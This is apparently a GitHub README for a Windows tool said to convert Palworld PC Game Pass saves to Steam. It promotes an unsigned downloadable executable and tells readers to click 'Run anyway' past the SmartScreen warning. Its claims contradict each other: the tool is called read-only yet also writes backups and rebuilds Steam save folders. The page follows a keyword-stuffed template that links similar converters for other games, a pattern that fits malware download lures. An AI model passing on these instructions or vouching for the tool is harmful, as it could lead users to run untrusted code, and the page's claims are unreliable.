<p align="center">
  <img src="https://i.postimg.cc/qRCZJMqb/banner.png" alt="Palworld Game Pass to Steam Save Bridge — Convert Xbox App WGS Worlds to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-palworld--wgs--bridge--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Palworld Game Pass to Steam Save Bridge — Convert Xbox App WGS Worlds to Steam

**Built a massive base and Palbox on PC Game Pass and moving to Steam for dedicated servers or mods? Xbox App splits Level.sav, LevelMeta.sav, and Players\*.sav across hashed WGS blobs. Reconstruct your full Palworld world for Steam cleanly.**

Palworld Game Pass to Steam Save Bridge automates rebuilding Palworld's multi-file world tree from Xbox App containers: **reading `%LOCALAPPDATA%\Packages\PocketpairInc.Palworld_*\SystemAppData\wgs\container.index` to reconstruct `Level.sav`, `LevelMeta.sav`, `LocalData.sav`, and the `Players\` subfolder inside `%LOCALAPPDATA%\Pal\Saved\SaveGames\<SteamID>`**.

This project is aimed at **Palworld on Windows 10/11 PC** for migrating worlds and player data between PC Game Pass and Steam—not editing Pal stats or world settings.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Steam Palworld does not see my Game Pass world | Xbox App scatters `Level.sav` and `Players\*.sav` across hashed `wgs` blobs | Rebuild `<WorldID>\Level.sav`, `LevelMeta.sav`, and `Players\` via `container.index` |
| World loads on Steam, but asks to create a new character | Missing `Players\*.sav` or host Player UID (`0000...0001`) mismatch | Extract paired `Players\*.sav` alongside `Level.sav` from the same `wgs` container |
| World disappears from Select World menu | `LevelMeta.sav` missing or `0 KB` inside the Steam `<WorldID>` folder | Ensure `LevelMeta.sav` is extracted alongside `Level.sav` |
| Steam Cloud overwrites migrated world on launch | Steam Cloud syncs an empty profile over manually copied folders | Create a new dummy world in Steam first, exit, then replace its files |

## Download for Windows

[**Download PalworldWGSBridge.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/PalworldWGSBridge.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `PalworldWGSBridge.exe`? (Automatic checks in ~2 seconds)

- Locates `%LOCALAPPDATA%\Packages\PocketpairInc.Palworld_*\SystemAppData\wgs` automatically.
- Reconstructs the exact `<WorldID>\Level.sav`, `LevelMeta.sav`, `LocalData.sav`, and `Players\` hierarchy.
- Creates a full dated backup of both your Xbox `wgs` and Steam `SaveGames` folders first.
- Preserves your original Xbox Game Pass world untouched.

### Sample Diagnostic Output

```text
[PalworldWGSBridge] Scanning PocketpairInc.Palworld WGS & Steam SaveGames...
[OK]   Game Pass Package: C:\Users\Player\AppData\Local\Packages\PocketpairInc.Palworld_ad4psfrxyesvt
[OK]   Decoded World    : World_9F21A4C0 (Level.sav: 19.2 MB, LevelMeta.sav: 12 KB, Players: 2)
[OK]   Backup Created   : Documents\Palworld-WGS-Backup\2026-11-20\
[OK]   Steam Target     : C:\Users\Player\AppData\Local\Pal\Saved\SaveGames\76561198041299104 (Ready)
```

The release ZIP is named `PalworldWGSBridge.zip`; the Windows executable inside is named `PalworldWGSBridge.exe`.

1. Close Palworld before moving or checking files.
2. Click **Download PalworldWGSBridge.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `PalworldWGSBridge.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Palworld and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of Palworld installed.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `PalworldWGSBridge.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Multi-file world structure split inside Xbox `wgs`

Unlike single-file games, a Palworld save requires `Level.sav`, `LevelMeta.sav`, `LocalData.sav`, and `Players\<PlayerUID>.sav` arranged in an exact directory tree.

### Host Player UID (`00000000000000000000000000000001`) mapping

Single-player/co-op hosts use the `0000...0001.sav` player file inside `Players\`; missing this file forces new character creation.

### Initializing Steam's `<SteamID>` directory cleanly

Creating a temporary world in Steam Palworld first generates the exact `<SteamID>` folder and registers it with Steam Cloud.

### Protecting existing worlds with automatic backups

Always archiving both Game Pass and Steam save trees prevents accidental data loss.

## Where Palworld files normally belong

Palworld stores PC Game Pass and Steam saves in two separate `%LOCALAPPDATA%` structures:

```text
%LOCALAPPDATA%\Packages\PocketpairInc.Palworld_ad4psfrxyesvt\SystemAppData\wgs\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\PocketpairInc.Palworld_*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<HexBlobs>

Steam Edition (Target):
%LOCALAPPDATA%\Pal\Saved\SaveGames\<SteamID>\<WorldID>\
├── Level.sav
├── LevelMeta.sav
├── LocalData.sav
└── Players\00000000000000000000000000000001.sav
```

Both PC Game Pass and Steam versions must be on compatible major game patches before migrating `Level.sav`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Palworld on both Xbox App and Steam.** Ensure cloud sync finishes before inspecting `wgs`.
2. **Launch Steam Palworld, create a temporary world, and exit.** Initializes `%LOCALAPPDATA%\Pal\Saved\SaveGames\<SteamID>`.
3. **Back up both `wgs` and Steam `SaveGames` folders.** Save dated copies in Documents.
4. **Reconstruct the `<WorldID>` folder tree into Steam `SaveGames\<SteamID>`.** Confirm `Level.sav`, `LevelMeta.sav`, and `Players\` are all present.
5. **Launch Steam Palworld and load your migrated world.** Verify your bases, Palbox, and character level appear properly.

### Before moving any files

Never alter files inside `SystemAppData\wgs\`; work strictly from extracted copies.

## What an effective diagnostic report should tell you

A clear bridge report displays **source `PocketpairInc.Palworld_*` path, decoded world files (`Level.sav`, `Players\`), backup path, and Steam target folder**.

## FAQ

**Can I transfer my Palworld world from Xbox Game Pass PC to Steam?**

Yes—reconstructing `Level.sav`, `LevelMeta.sav`, and `Players\` from `SystemAppData\wgs` allows Steam Palworld to load your world.

**Why did my world load on Steam but ask me to create a new character?**

That happens when `Level.sav` was copied without its matching `Players\00000000000000000000000000000001.sav` file.

**Does this delete my Xbox Game Pass save?**

No. Your Game Pass `wgs` folder is read-only and remains completely untouched.

## Useful reading

- [Palworld on Steam](https://store.steampowered.com/app/1623730/Palworld/)
- [Official Palworld Website (Pocketpair)](https://www.pocketpair.jp/palworld)

## More Windows Game Diagnostic Tools

- [Palworld-WorldSaveSentinel](../Palworld-WorldSaveSentinel) — Palworld `Level.sav` backup & UE4SS / `~mods` sentinel
- [Fable2026-GamePassSaveBridge](../Fable2026-GamePassSaveBridge) — Fable (2026) Game Pass ↔ Steam save converter
- [GearsEDay-WGSSaveConverter](../GearsEDay-WGSSaveConverter) — Gears of War: E-Day Game Pass ↔ Steam save converter
- [Starfield-WGSSaveConverter](../Starfield-WGSSaveConverter) — Starfield Game Pass (`wgs`) ↔ Steam `.sfs` save converter

*Independent community project. Not affiliated with Pocketpair, Inc., Microsoft, Valve, or Steam.*
 
 
 
 
 
 
